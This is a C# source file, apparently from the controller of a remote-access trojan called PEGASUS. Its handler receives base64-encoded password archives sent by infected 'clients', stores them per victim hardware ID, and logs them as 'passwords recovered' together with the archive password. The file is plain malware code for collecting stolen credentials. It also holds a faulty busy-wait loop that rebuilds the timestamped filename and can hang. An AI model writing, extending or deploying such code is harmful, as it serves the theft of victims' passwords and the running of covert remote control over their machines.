namespace PEGASUS.BytesInOut
{
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System;
    using System.Drawing;
    using System.IO;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleKATANA" />.
    /// </summary>
    public class HandleKATANA
    {
        /// <summary>
        /// Initializes a new instance of the <see cref="HandleKATANA"/> class.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public HandleKATANA(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "KATANA");
                var zip = unpack_msgpack.ForcePathObject("Zip").AsString;
                if (!Directory.Exists(fullPath))
                    Directory.CreateDirectory(fullPath);
                File.WriteAllBytes(
                    Path.Combine(fullPath, "Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip"),
                    Convert.FromBase64String(zip));
                do
                {
                    // Do nothing until the file exists 
                } while (!File.Exists(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip"));
                new HandleLogs().Addmsg(
                    $"Client {client.Ip} passwords recovered,file located @ ClientsFolder ,Pass:pegasus",
                    Color.Purple);
                //using (var forml = new FrmKATANA())
                //{
                //forml.ShowDialog();
                //}

            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}
